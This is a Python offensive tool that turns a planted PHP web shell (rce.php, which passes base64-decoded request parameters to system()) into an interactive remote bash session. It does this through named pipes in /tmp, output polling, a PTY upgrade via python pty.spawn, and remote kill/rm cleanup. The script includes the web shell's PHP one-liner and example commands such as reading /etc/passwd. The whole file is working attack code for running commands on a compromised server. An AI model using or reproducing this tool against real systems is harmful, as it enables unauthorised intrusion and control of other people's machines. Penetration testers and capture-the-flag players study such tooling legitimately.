#!/usr/bin/python3

# Author: Hypnoze57 <Hypnoze57@protonmail.com>

"""
What the fuck is going wrong with env/pwd/whoami cmd?
# env, pwd, whoami --> echo cmd > fifo
# others cmd --> echo "cmd" > fifo
"""

import requests
import time
from threading import Thread
from random import randint
from base64 import b64encode
from termcolor import colored


WRITABLE_FOLDER = '/tmp'  # Prefer /dev/shm if write permission is set to your current user
BEACONING_DELAY = .3   # secs
UPGRADE_CMD_DELAY = 2  # secs

WTF_CMD = ['env', 'pwd', 'whoami']


def execute(cmd, timeout=None, verbose=False):
    """
    :cmd      Raw shell command to execute on the remote system
    :timetout MANDATORY: Used to kill the shell execution loop (started after the named pipe creation).
              If you cannot use timeout, put the named pipe creation in a separated thread.
    :verbose  Print full cmd executed on the remote system (Debug mode)

    execute(...) -> return string that is raw output of cmd
    """

    if verbose:
        pcmd = colored(cmd, 'white', 'on_red')
        print("Executing %s" % (pcmd))
        if timeout:
            print("Timeout: %s" % (timeout))

    # Encoding to avoid bad chars in URL
    cmd = b64encode(cmd.encode()).decode()

    # rce.php --> <?php @system(base64_decode($_REQUEST['cmd'])); ?>
    try:
        r = requests.get('http://pwn:54345/ppwnme/rce.php?cmd=%s' % (cmd), timeout=timeout)
    except requests.exceptions.Timeout:
        return None

    return r.text.strip()


class GetOutput(Thread):
    def __init__(self, sessid, removeFirstLineBeforePrinting=False):
        super(GetOutput, self).__init__(name='GetOutput')
        self.sessid = sessid

        self.rflbp = removeFirstLineBeforePrinting
        self.pause = False
        self.stop = False

    def read_output(self):
        out = execute('cat %s/out.%d' % (WRITABLE_FOLDER, self.sessid))
        if out != '':
            execute('echo '' > %s/out.%d' % (WRITABLE_FOLDER, self.sessid))  # Clean output for next GetOutput request
            return out
        return None

    def run(self):
        while not self.stop:
            while self.pause:
                time.sleep(.1)

            out = self.read_output()
            if out:
                if self.rflbp:
                    out = '\n'.join(out.split('\n')[1:])
                else:
                    self.rflbp = True
                print('%s ' % (out), end='')
            time.sleep(BEACONING_DELAY)


class NamedPipe(object):
    def __init__(self, timeout=3.5):
        self.sessid = randint(1000, 100000)
        self.timeout = timeout

    def create(self):
        # cmd = "mkfifo {F}/in.{id}; (tail -f {F}/in.{id} | /bin/bash -i > {F}/out.{id} 2>&1)".format(F=WRITABLE_FOLDER, id=self.sessid)
        cmd = "mkfifo {F}/in.{id}".format(F=WRITABLE_FOLDER, id=self.sessid)
        execute(cmd)
        cmd = "tail -f {F}/in.{id} | /bin/bash -i > {F}/out.{id} 2>&1".format(F=WRITABLE_FOLDER, id=self.sessid)
        execute(cmd, timeout=self.timeout)

    def clean(self):
        cmd = 'rm {F}/in.{id} {F}/out.{id}'.format(F=WRITABLE_FOLDER, id=np.sessid)
        execute(cmd)

    def kill_process(self):
        cmd = "kill -9 $(ps aux | grep -E -m1 '(in|out)\\.%s'|awk -F ' ' '{print $2}')" % (self.sessid)
        execute(cmd)
        time.sleep(UPGRADE_CMD_DELAY)
        execute(cmd)


class FShell(object):
    def __init__(self, sessid, GetOutputThread):
        self.sessid = sessid
        self.out = GetOutputThread

        self.base_cmd = 'echo {cmd} > {F}/in.{id}'

        self.upgraded = False

    def format_cmd(self, cmd):
        return self.base_cmd.format(cmd=cmd, F=WRITABLE_FOLDER, id=self.sessid)

    def upgrade_shell(self):
        print(colored("Upgrading shell.. (~10 secs)", 'green'))

        # self.out.rflbp = True
        self.out.pause = True

        execute(self.format_cmd('"python -c \'import pty;pty.spawn(\\"/bin/bash\\")\'"'))
        time.sleep(UPGRADE_CMD_DELAY*2)
        execute(self.format_cmd('"export TERM=xterm"'))
        time.sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('"alias ls=\'ls --color=auto\'"'))
        time.sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('"alias ll=\'ls -lah\' "'))
        time.sleep(UPGRADE_CMD_DELAY)

        self.out.pause = False
        self.upgraded = True

    def run(self):
        while True:
            try:
                raw_cmd = input()
            except KeyboardInterrupt:
                print("\nUse '%s' to quit!\n" % (colored('exit_shell', 'red')))
                self.ps1()
                continue

            if not raw_cmd:
                self.ps1()
                continue
            elif raw_cmd == 'exit_shell':
                print("Closing user FShell!")
                break
            elif raw_cmd == 'upgrade_shell':
                if not self.upgraded:
                    self.upgrade_shell()
                else:
                    print(colored("Already upgraded!", 'red'))
                continue
            elif raw_cmd == 'get_sessid':
                print(colored('FShell sessid %s' % (self.sessid), 'red'))
                self.ps1()
                continue
            elif raw_cmd == 'help_shell':
                self.print_help()
                self.ps1()
                continue
            elif raw_cmd not in WTF_CMD:
                raw_cmd = '"%s"' % (raw_cmd)

            execute(self.format_cmd(raw_cmd))  # , True) # Debug mode
            time.sleep(.2)  # restore remote PS1 before input() again

        print("Closing remote shell..")
        self.close_shell()

    def close_shell(self):
        self.out.stop = True
        if self.upgraded:
            execute(self.format_cmd('exit ;'))
            time.sleep(UPGRADE_CMD_DELAY)
            execute(self.format_cmd('exit'))
            time.sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('exit ;'))

    def print_help(self):
        print(
        """
        get_sessid:     Print session id (/WRITABLE_FOLDER/{in,out}.{sessid} files on the remote system)
        upgrade_shell:  Upgrade to tty using python pty and bash
        exit_shell:     Send 3 exit command if shell is upgraded, 1 if not
        """)

    def ps1(self):
        print("$> ", end='')


def advertise():
    WARNING = "WARNING! If you don't get any response back, try to add a space and/or semi colon at the end of your command."
    WARNING_2 = "Eg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'"
    UPGRADE_MSG = "Use '%s' command to get interactive tty on the remote server" % (colored('upgrade_shell', 'red'))

    print(colored(WARNING, 'white', 'on_red'))
    print(colored(WARNING_2, 'white', 'on_red'))
    print("\n%s\n" % (UPGRADE_MSG))


if __name__ == '__main__':
    advertise()

    np = NamedPipe()
    print("Creating Named Pipe (%d)..." % (np.sessid))
    np.create()
    print("Created!")

    # Execute a command in named pipe to create output file and avoid remote server error logging for first GetOuput request
    execute('echo id > {F}/in.{id}'.format(F=WRITABLE_FOLDER, id=np.sessid))

    out = GetOutput(np.sessid)
    out.start()

    shell = FShell(np.sessid, out)
    shell.run()  # Pop the shell

    print("Killing loop process!")
    np.kill_process()

    print("Cleaning sessions files on the remote server...")
    np.clean()

    while out.isAlive():
        print("Waiting for 'GetOutput' thread...")
        time.sleep(1)

    print("See you soon !")
